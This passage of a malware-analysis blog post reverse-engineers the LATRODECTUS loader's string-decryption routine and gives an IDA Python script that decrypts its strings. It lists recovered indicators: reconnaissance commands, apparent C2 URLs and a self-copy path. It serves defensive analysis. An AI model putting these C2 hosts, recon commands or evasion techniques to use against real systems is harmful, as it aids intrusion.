</span></span></code></pre></div><p>all that&rsquo;s left is <code>v3</code>. it first appears inside the loop.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(start_index_encrypted_string <span style="color:#ff79c6">+</span> i);
</span></span></code></pre></div><p><code>v3</code> is assigned the value of the byte located at <code>start_index_encrypted_string + i</code> (the current byte being processed inside the loop). this byte is retrieved from <code>encrypted_string</code>, starting from the address pointed to by <code>start_index_encrypted_string</code> and advancing by <code>i</code> with each iteration.</p>
<p>jumping slightly ahead, <code>v3</code> is the byte that gets <code>XOR</code>&rsquo;d with <code>xor_key</code> to produce the decrypted byte.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> xor_key <span style="color:#ff79c6">^</span> v3;
</span></span></code></pre></div><p>through this, we can infer that <code>v3</code> is the encrypted byte being processed in the current loop iteration.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_18000ACC8</span>(<span style="color:#ff79c6">__int64</span> encrypted_string, <span style="color:#ff79c6">__int64</span> decrypted_string)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> current_encrypted_byte; <span style="color:#6272a4">// [rsp+20h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> i; <span style="color:#6272a4">// [rsp+24h] [rbp-14h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> decrypted_string_length; <span style="color:#6272a4">// [rsp+28h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span> xor_key; <span style="color:#6272a4">// [rsp+2Ch] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">__int64</span> start_index_encrypted_string; <span style="color:#6272a4">// [rsp+40h] [rbp+8h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    increment_value(<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>    xor_key <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    decrypted_string_length <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)encrypted_string;
</span></span><span style="display:flex;"><span>    start_index_encrypted_string <span style="color:#ff79c6">=</span> encrypted_string <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">6</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">int</span>)decrypted_string_length; <span style="color:#ff79c6">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        current_encrypted_byte <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(start_index_encrypted_string <span style="color:#ff79c6">+</span> i);
</span></span><span style="display:flex;"><span>        xor_key <span style="color:#ff79c6">=</span> increment_value(xor_key);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">+=</span> current_encrypted_byte <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">10</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(decrypted_string <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> xor_key <span style="color:#ff79c6">^</span> current_encrypted_byte;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> decrypted_string;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>the function is now deciphered! it appears to be decrypting an encrypted string, using a combination of XOR encryption and additional arithmetic manipulation. it processes each byte of the <code>encrypted_string</code>, performs operations on it, then writes the result to <code>decrypted_string</code>.</p>
<p>here&rsquo;s a more detailed flow summary, for the curious.</p>
<p><code>xor_key</code> extracted from first 4 bytes of <code>encrypted_string</code>, and serves as the initial XOR key.</p>
<p><code>decrypted_string_length</code> is calculated by XOR-ing a 2-byte value starting at the 5th byte of <code>encrypted_string</code> with the <code>xor_key</code>. this value is the length of the <code>decrypted_string</code> to be processed.</p>
<p><code>start_index_encrypted_string</code> points to the start of the actual encrypted data within <code>encrypted_string</code>, skipping the first 6 bytes.</p>
<p>the function then enters a loop that runs <code>decrypted_string_length</code> times, processing each byte of the encrypted data.</p>
<p><code>current_encrypted_byte</code> is set to the byte at the current index <code>i</code> within the encrypted data. <code>xor_key</code> is updated using <code>increment_value</code> (altering the key for the next iteration). the byte at the current index of <code>decrypted_string</code> is first incremented by the value of <code>current_encrypted_byte</code> + 10. finally, the adjusted byte is XOR&rsquo;d with the updated <code>xor_key</code>, completing the decryption for the byte. this result is stored in <code>decrypted_string</code> at the corresponding index.</p>
<h1 id="automating-the-decryption">automating the decryption</h1>
<p>now that we know how the decryption/encryption works, automating the process to decrypt all the strings encrypted by the malware should be straightforward.</p>
<p>i&rsquo;ve included comments in the code below so you can get a better understanding of the thought process behind it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> idaapi<span style="color:#ff79c6">,</span> idc<span style="color:#ff79c6">,</span> idautils
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># find all cross-refs to given func address</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">find_fn_Xrefs</span>(fn_addr):
</span></span><span style="display:flex;"><span>    xref_list <span style="color:#ff79c6">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># iterate thru all refs to the func</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ref <span style="color:#ff79c6">in</span> idautils<span style="color:#ff79c6">.</span>XrefsTo(fn_addr):
</span></span><span style="display:flex;"><span>        xref <span style="color:#ff79c6">=</span> {}
</span></span><span style="display:flex;"><span>        xref[<span style="color:#f1fa8c">&#39;normal&#39;</span>] <span style="color:#ff79c6">=</span> ref<span style="color:#ff79c6">.</span>frm <span style="color:#6272a4"># normal address of the reference</span>
</span></span><span style="display:flex;"><span>        xref[<span style="color:#f1fa8c">&#39;hex&#39;</span>] <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">hex</span>(ref<span style="color:#ff79c6">.</span>frm) <span style="color:#6272a4"># hex address of the reference</span>
</span></span><span style="display:flex;"><span>        xref_list<span style="color:#ff79c6">.</span>append(xref) <span style="color:#6272a4"># append reference to list</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> xref_list
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># get specific number of bytes from memory address</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_bytes_from_address</span>(addr, length):
</span></span><span style="display:flex;"><span>    ea <span style="color:#ff79c6">=</span> addr
</span></span><span style="display:flex;"><span>    ret_data <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">bytearray</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># read specified number of bytes from address</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>, length):
</span></span><span style="display:flex;"><span>        data <span style="color:#ff79c6">=</span> idc<span style="color:#ff79c6">.</span>get_bytes(ea <span style="color:#ff79c6">+</span> i, <span style="color:#bd93f9">1</span>) <span style="color:#6272a4"># get one byte at a time</span>
</span></span><span style="display:flex;"><span>        ret_data<span style="color:#ff79c6">.</span>append(data[<span style="color:#bd93f9">0</span>]) <span style="color:#6272a4"># append byte to bytearray</span>
</span></span><span style="display:flex;"><span>        i <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> ret_data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># retrieve nth argument passed to function using fastcall</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_fastcall_args_number</span>(fn_addr, arg_number):
</span></span><span style="display:flex;"><span>    args <span style="color:#ff79c6">=</span> []
</span></span><span style="display:flex;"><span>    arg_count <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>    ptr_addr <span style="color:#ff79c6">=</span> fn_addr
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># walk back thru instructions to find args</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">True</span>:
</span></span><span style="display:flex;"><span>        ptr_addr <span style="color:#ff79c6">=</span> idc<span style="color:#ff79c6">.</span>prev_head(ptr_addr) <span style="color:#6272a4"># get previous instruction</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># check for &#39;mov&#39; or &#39;lea&#39; instructions [typically set up args]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> idc<span style="color:#ff79c6">.</span>print_insn_mnem(ptr_addr) <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;mov&#39;</span> <span style="color:#ff79c6">or</span> idc<span style="color:#ff79c6">.</span>print_insn_mnem(ptr_addr) <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;lea&#39;</span>:
</span></span><span style="display:flex;"><span>            arg_count <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> arg_count <span style="color:#ff79c6">==</span> arg_number:
</span></span><span style="display:flex;"><span>                <span style="color:#6272a4"># if desired arg number is reached</span>
</span></span><span style="display:flex;"><span>                <span style="color:#6272a4"># determine types of operand and retrieve the value</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> idc<span style="color:#ff79c6">.</span>get_operand_type(ptr_addr, <span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">==</span> idc<span style="color:#ff79c6">.</span>o_mem:
</span></span><span style="display:flex;"><span>                    args<span style="color:#ff79c6">.</span>append(idc<span style="color:#ff79c6">.</span>get_operand_value(ptr_addr, <span style="color:#bd93f9">1</span>))
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">elif</span> idc<span style="color:#ff79c6">.</span>get_operand_type(ptr_addr, <span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">==</span> idc<span style="color:#ff79c6">.</span>o_imm:
</span></span><span style="display:flex;"><span>                    args<span style="color:#ff79c6">.</span>append(idc<span style="color:#ff79c6">.</span>get_operand_value(ptr_addr, <span style="color:#bd93f9">1</span>))
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">elif</span> idc<span style="color:#ff79c6">.</span>get_operand_type(ptr_addr, <span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">==</span> idc<span style="color:#ff79c6">.</span>o_reg:
</span></span><span style="display:flex;"><span>                    reg_name <span style="color:#ff79c6">=</span> idaapi<span style="color:#ff79c6">.</span>get_reg_name(idc<span style="color:#ff79c6">.</span>get_operand_value(ptr_addr, <span style="color:#bd93f9">1</span>), <span style="color:#bd93f9">4</span>)
</span></span><span style="display:flex;"><span>                    reg_value <span style="color:#ff79c6">=</span> get_reg_value(ptr_addr, reg_name)
</span></span><span style="display:flex;"><span>                    args<span style="color:#ff79c6">.</span>append(reg_value)
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>                    <span style="color:#6272a4"># handle cases where operand type not recognized</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;exception in get_stack_args&#34;</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">return</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">return</span> args
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">continue</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> args
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># decode string from bytes (utf-8 and utf-16 encoding)</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">decode_str</span>(s) <span style="color:#ff79c6">-&gt;</span> <span style="color:#8be9fd;font-style:italic">str</span>:
</span></span><span style="display:flex;"><span>    is_wide_str <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">len</span>(s) <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">and</span> s[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> <span style="color:#6272a4"># check if wide string (utf-16)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    result_str <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># decode based on encoding</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> is_wide_str:
</span></span><span style="display:flex;"><span>        result_str <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>decode(<span style="color:#f1fa8c">&#34;utf8&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>        result_str <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>decode(<span style="color:#f1fa8c">&#34;utf-16le&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># return if result valid ASCII string</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> result_str<span style="color:#ff79c6">.</span>isascii():
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> result_str
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># perform decryption on encrypted string using malware logic</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">decrypt</span>(a1):
</span></span><span style="display:flex;"><span>    result <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">bytearray</span>() <span style="color:#6272a4"># hold decrypted string in bytearray</span>
</span></span><span style="display:flex;"><span>    key <span style="color:#ff79c6">=</span> a1[<span style="color:#bd93f9">0</span>] <span style="color:#6272a4"># init key with first byte of encrypted string</span>
</span></span><span style="display:flex;"><span>    result_len <span style="color:#ff79c6">=</span> a1[<span style="color:#bd93f9">4</span>] <span style="color:#ff79c6">^</span> a1[<span style="color:#bd93f9">0</span>] <span style="color:#6272a4"># calculate length of decrypted string (using XOR)</span>
</span></span><span style="display:flex;"><span>    v8 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">6</span> <span style="color:#6272a4"># offset to start of encrypted data within array</span>
</span></span><span style="display:flex;"><span>    extracted_data <span style="color:#ff79c6">=</span> a1[<span style="color:#bd93f9">6</span>:<span style="color:#bd93f9">6</span> <span style="color:#ff79c6">+</span> result_len] <span style="color:#6272a4"># extract encrypted data (bytes)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># loop thru encrypted data + decrypt each byte</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(result_len):
</span></span><span style="display:flex;"><span>        key <span style="color:#ff79c6">=</span> key <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span> <span style="color:#6272a4"># increment key</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;debug: key: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(key)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">, extracted_data[i] : </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(extracted_data[i])<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">, result: </span><span style="color:#f1fa8c">{</span>extracted_data[i] <span style="color:#ff79c6">^</span> key<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>        result<span style="color:#ff79c6">.</span>append(extracted_data[i] <span style="color:#ff79c6">^</span> key) <span style="color:#6272a4"># XOR each byte with updated key</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;debug: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">len</span>(result)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> | </span><span style="color:#f1fa8c">{</span>result<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> decode_str(result) <span style="color:#6272a4"># decode + return resulting string</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># set comments in hex-rays decompiler view @ specific address</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">set_hexrays_comment</span>(address, text):
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;setting hex rays comment&#34;</span>)
</span></span><span style="display:flex;"><span>    cfunc <span style="color:#ff79c6">=</span> idaapi<span style="color:#ff79c6">.</span>decompile(address) <span style="color:#6272a4"># decompile func @ given address</span>
</span></span><span style="display:flex;"><span>    tl <span style="color:#ff79c6">=</span> idaapi<span style="color:#ff79c6">.</span>treeloc_t()
</span></span><span style="display:flex;"><span>    tl<span style="color:#ff79c6">.</span>ea <span style="color:#ff79c6">=</span> address
</span></span><span style="display:flex;"><span>    tl<span style="color:#ff79c6">.</span>itp <span style="color:#ff79c6">=</span> idaapi<span style="color:#ff79c6">.</span>ITP_SEMI
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># set comment if decompilation was successful</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> cfunc:
</span></span><span style="display:flex;"><span>        cfunc<span style="color:#ff79c6">.</span>set_user_cmt(tl, text)
</span></span><span style="display:flex;"><span>        cfunc<span style="color:#ff79c6">.</span>save_user_cmts()
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;decompile failed: </span><span style="color:#f1fa8c">{:#x}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(address))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># set comment in disassembly + decompiler view</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">set_comment</span>(address, text):
</span></span><span style="display:flex;"><span>    idc<span style="color:#ff79c6">.</span>set_cmt(address, text, <span style="color:#bd93f9">0</span>) <span style="color:#6272a4"># set comment in disassembly view</span>
</span></span><span style="display:flex;"><span>    set_hexrays_comment(address, text) <span style="color:#6272a4"># set comment in decompiler view</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># main block below</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># set address of decryption function</span>
</span></span><span style="display:flex;"><span>decryption_fn_address <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x000000018000ACC8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># get cross-refs to decryption func</span>
</span></span><span style="display:flex;"><span>xref_list <span style="color:#ff79c6">=</span> find_fn_Xrefs(decryption_fn_address)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># iterate over each reference</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> ref <span style="color:#ff79c6">in</span> xref_list:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;func address : </span><span style="color:#f1fa8c">{</span>ref[<span style="color:#f1fa8c">&#39;hex&#39;</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">, </span><span style="color:#f1fa8c">{</span>ref[<span style="color:#f1fa8c">&#39;normal&#39;</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># retrieve first arg passed to decryption func (address of encrypted_string)</span>
</span></span><span style="display:flex;"><span>    arg_address_hex <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">hex</span>(get_fastcall_args_number(ref[<span style="color:#f1fa8c">&#39;normal&#39;</span>], <span style="color:#bd93f9">1</span>)[<span style="color:#bd93f9">0</span>])
</span></span><span style="display:flex;"><span>    arg_address <span style="color:#ff79c6">=</span> get_fastcall_args_number(ref[<span style="color:#f1fa8c">&#39;normal&#39;</span>], <span style="color:#bd93f9">1</span>)[<span style="color:#bd93f9">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># read first 6 bytes from arg address to calculate length of decrypted string</span>
</span></span><span style="display:flex;"><span>    enc_value <span style="color:#ff79c6">=</span> get_bytes_from_address(arg_address, <span style="color:#bd93f9">8</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;debug: enc_value[0] : </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(enc_value[<span style="color:#bd93f9">0</span>])<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">, enc_value[4]: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(enc_value[<span style="color:#bd93f9">4</span>])<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>    result_str_len <span style="color:#ff79c6">=</span> enc_value[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">^</span> enc_value[<span style="color:#bd93f9">4</span>]  <span style="color:#6272a4"># calculate decrypted string length</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;result char count : </span><span style="color:#f1fa8c">{</span>result_str_len<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># read bytes to decrypt full string</span>
</span></span><span style="display:flex;"><span>    enc_value <span style="color:#ff79c6">=</span> get_bytes_from_address(arg_address, <span style="color:#bd93f9">6</span> <span style="color:#ff79c6">+</span> result_str_len)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># proceed with decryption only if string doesn&#39;t contain invalid bytes</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\xff\xff\xff\xff</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">not</span> <span style="color:#ff79c6">in</span> enc_value:
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;debug: len : </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">len</span>(enc_value)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">, enc_value: </span><span style="color:#f1fa8c">{</span>enc_value<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>        dec_string <span style="color:#ff79c6">=</span> decrypt(enc_value)  <span style="color:#6272a4"># decrypt string</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;decrypted string: </span><span style="color:#f1fa8c">{</span>dec_string<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>        set_comment(ref[<span style="color:#f1fa8c">&#39;normal&#39;</span>], dec_string)  <span style="color:#6272a4"># decrypted string as comment in IDA</span>
</span></span></code></pre></div><p>here are some of the strings that were decrypted.</p>
<p><p class="imgp">
  <img loading="lazy" src="/image-6.png" alt="xrefs"  />
</p>
</p>
<p>cross-references [xrefs] to the <code>string_decryption</code> function reveal instances where each call is associated with different strings, like <code>pid</code>, <code>%d</code>, <code>proc</code>, <code>subproc</code>, etc. these are probably used for for command execution or process management within the malware.</p>
<p><p class="imgp">
  <img loading="lazy" src="/image-7.png" alt="CLI commands"  />
</p>
</p>
<p>additional calls to <code>string_decryption</code> show CLI commands like <code>ipconfig /all</code>, <code>systeminfo</code>, <code>net view /all</code>. these are used to gather system + network information [i.e. reconnaissance].</p>
<p><p class="imgp">
  <img loading="lazy" src="/image-8.png" alt="HTTP methods"  />
</p>
</p>
<p>more decrypted strings relating to HTTP requests, like <code>Mozilla/4.0</code>, <code>Content-Type: application/x-www-form-urlencoded</code>, and methods like <code>POST</code> and <code>GET</code>. this suggests the malware is communicating with its C2 server.</p>
<p><p class="imgp">
  <img loading="lazy" src="/image-9.png" alt="URLs"  />
</p>
</p>
<p>more decrypted strings. URLs like <code>https://scifimond.com/live/</code> and <code>https://drifajizo.fun/live/</code> show up, which are probably part of the infrastructure used for C2 communication + delivery.</p>
<p><p class="imgp">
  <img loading="lazy" src="/image-10.png" alt="copying"  />
</p>
</p>
<p>decrypted strings show file paths + registry keys, like <code>C:\WINDOWS\SYSTEM32\rundll32.exe</code> and <code>\update_data.dat</code>. this suggests that the malware copies itself to a temporary location, exits the original location, and executes from the temporary location.</p>
<h2 id="detecting-the-tactics--techniques-used-by-latrodectus">detecting the tactics + techniques used by <code>LATRODECTUS</code></h2>
<p>this malware is a sophisticated loader, designed to deliver further payloads to compromised targets. it uses a multi-stage infection process that begins with a phishing email containing a link to a JavaScript dropper. the dropper connects to the C2 server to download a <code>.msi</code> file, which loads a packed DLL when executed. the unpacked DLL then performs activities like resolving critical APIs dynamically, decrypting encrypted strings, and executing commands for recon and persistence.</p>
<h3 id="recap-dynamic-api-resolution--string-decryption">recap: dynamic API resolution + string decryption</h3>
<p>when analyzing the decompilation, i identified several dynamic API resolutions where the hashes were used to resolve addresses of critical Windows Native APIs.</p>
<p>these APIs [<code>NtAllocateVirtualMemory</code>, <code>NtCreateThread</code>, <code>VirtualProtect</code>, etc.] and their resolution allows <code>LATRODECTUS</code> to perform memory allocation, thread creation, and memory protection changes.</p>
<p><code>LATRODECTUS</code> also used a custom string decryption routine, that can decrypt various strings that are initially stored in an encrypted format within the binary. the decrypted strings include CLI arguments, URLs, registry paths, and more.</p>
